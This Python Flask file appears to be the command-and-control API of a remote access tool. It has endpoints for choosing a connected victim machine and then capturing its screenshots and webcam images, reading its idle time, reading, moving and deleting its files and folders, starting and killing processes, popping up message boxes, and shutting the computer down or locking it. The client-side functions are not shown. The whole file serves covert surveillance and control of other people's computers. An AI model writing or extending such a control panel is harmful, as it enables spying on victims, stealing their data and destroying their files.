from flask import Flask, jsonify, request
import threading
import logging
import base64
import sys

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
api = Flask(__name__)

routes = [
    "/api/create-message/<message>",
    "/api/get-connected-webcams",
    "/api/get-client",
]

api.connection = None
api.clients = None
api.clientInfo = None
api.clients_lock = threading.Lock()

# MIDDLEWARE
@api.before_request
def before_request():
    if (request.path in routes):
        if (api.connection == None):
            return jsonify({"status": "error", "message": "Not connected to a client."})

@api.post("/api/connect-client/<connectionId>")
def ConnectClient(connectionId):
    connectionId = int(connectionId)

    if (len(api.clients) > connectionId):
        api.connection = connectionId
        return jsonify({"status": 201, "message": "Client connected."})
    else:
        return jsonify({"status": 404, "message": "Client not found."})
    
@api.post("/api/disconnect-client")
def DisconnectClient():
    if (api.connection != None):
        api.connection = None
        return jsonify({"status": 201, "message": "Client disconnected."})
    else:
        return jsonify({"status": 204, "message": "No client connected."})

# POST ROUTES
@api.post("/api/create-message/<message>")
def CreateMessage(message):
    response = api.VBSMessageBox(api.connection, message)
    if (response):
        return jsonify({"status": "sent", "message": message})
    else:
        return jsonify({"status": "error", "message": "Failed to send message."})
    
@api.post("/api/change-wallpaper/<file>")
def ChangeWallpaper(file):
    response = api.ChangeWallpaper(api.connection, file)
    if (response == -1):
        return jsonify({"status": "error", "message": "Unable to find Local File."})
    elif (response == -2):
        return jsonify({"status": "error", "message": "Invalid File Type - Required: (JPEG, JPG, PNG)."})
    elif (response == -3):
        return jsonify({"status": "error", "message": "Unable to Transfer Image."})
    else:
        return jsonify({"status": "sent", "message": "Wallpaper changed."})
    
@api.post("/api/start-process")
def StartProcess():
    response = api.StartProcess(api.connection, request.json.get('process'))
    if (response):
        return jsonify({"status": "sent", "message": "Process started."})
    else:
        return jsonify({"status": "error", "message": "Unable to find Remote File."})
    
@api.post("/api/kill-process")
def KillProcess():
    response = api.KillProcess(api.connection, request.json.get('process'))
    if (response):
        return jsonify({"status": "sent", "message": "Process killed."})
    else:
        return jsonify({"status": "error", "message": "Unable to find Remote Process."})
    
@api.post("/api/wake-computer")
def WakeComputer():
    response = api.WakeComputer(api.connection)
    if (response):
        return jsonify({"status": "sent", "message": "Computer woken."})
    else:
        return jsonify({"status": "error", "message": "Unable to wake computer."})
    
@api.post("/api/shutdown-computer")
def ShutdownComputer():
    return jsonify(api.ShutdownComputer(api.connection))

@api.post("/api/restart-computer")
def RestartComputer():
    return jsonify(api.RestartComputer(api.connection))

@api.post("/api/lock-computer")
def LogoffComputer():
    return jsonify(api.LockComputer(api.connection))

@api.post("/api/move-file")
def MoveFile():
    response = api.MoveFile(api.connection, request.json.get('file'), request.json.get('destination'))
    if (response == -1):
        return jsonify({"status": "error", "message": "Unable to find Remote File."})
    
    elif (response == -2):
        return jsonify({"status": "error", "message": "Unable to find Remote Directory."})
    
    else:
        return jsonify({"status": "sent", "message": "File moved."})
    
@api.post("/api/delete-file")
def DeleteFile():
    response = api.DeleteFile(api.connection, request.json.get('file'))
    if (response):
        return jsonify({"status": "sent", "message": "File deleted."})
    else:
        return jsonify({"status": "error", "message": "Unable to find Remote File."})
    
@api.post("/api/delete-directory")
def DeleteDirectory():
    response = api.DeleteDirectory(api.connection, request.json.get('directory'))
    if (response):
        return jsonify({"status": "sent", "message": "Directory deleted."})
    else:
        return jsonify({"status": "error", "message": "Unable to find Remote Directory."})

# GET ROUTES
@api.get("/api/get-clients")
def GetClients():
    return jsonify(api.clientInfo)

@api.get('/api/get-client')
def GetClient():
    return jsonify(api.SystemInformation(api.connection))

@api.get("/api/get-screenshot")
def GetScreenshot():
    response = api.CaptureScreenshot(api.connection)
    return jsonify(
        {
            "length": response['length'],
            "image": base64.b64encode(response['image']).decode('utf-8')
        }
    )

@api.get("/api/get-connected-webcams")
def GetConnectedWebcams():
    webcams = api.GetConnectedWebcams(api.connection)
    if (webcams):
        connected = []

        for webcam in webcams.strip().split('\n'):
            connected.append({"name": webcam})

        return jsonify({"webcams": connected})
    else:
        return jsonify({"message": "No webcams connected."})
    
@api.get("/api/get-webcam/<webcam>/<seconds>")
def GetWebcam(webcam, seconds):
    response = api.CaptureWebcam(api.connection, webcam, seconds)
    if (response):
        return jsonify(
            {
                "length": response['length'],
                "image": base64.b64encode(response['image']).decode('utf-8')
            }
        )
    else:
        return jsonify({"message": "Webcam not found."})
    
@api.get("/api/get-tasks")
def ViewTasks():
    return api.ViewTasks(api.connection)
    
@api.get("/api/idle-time")
def GetIdleTime():
    return jsonify({"idleTime": api.IdleTime(api.connection)})

@api.get("/api/get-directory")
def GetDirectory():
    return jsonify(api.GetDirectory(api.connection))

@api.get("/api/view-files")
def ViewFiles():
    print(request.json.get('directory'))
    response = api.ViewFiles(api.connection, request.json.get('directory'))
    if (response == -1):
        return jsonify({"message": "Unable to find Remote Directory"})
    
    elif (response == -2):
        return jsonify({"message": "No Files Found"})
    
    else:
        return response
    
@api.get("/api/read-file")
def ReadFile():
    response = api.ReadFile(api.connection, request.json.get('file'))
    if (response == -1):
        return jsonify({"message": "Unable to find Remote File"})
    
    elif (response == -2):
        return jsonify({"message": "File is too Large"})
    
    elif (response == -3):
        return jsonify({"message": "Unable to Read File"})
    
    else:
        return jsonify(
            {
                "length": response['length'],
                "file": str(response['file'], "utf-8")
            }
        )

if __name__ == "__main__":
    api.run()